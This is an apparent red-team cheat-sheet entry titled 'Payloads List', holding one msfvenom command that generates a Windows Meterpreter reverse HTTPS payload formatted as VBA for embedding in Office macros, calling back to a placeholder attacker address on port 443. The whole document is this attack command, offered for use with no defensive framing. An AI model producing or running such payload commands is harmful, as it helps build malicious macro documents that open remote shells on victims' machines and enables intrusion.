# Payloads List

## VBA Format
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f vbapplication
```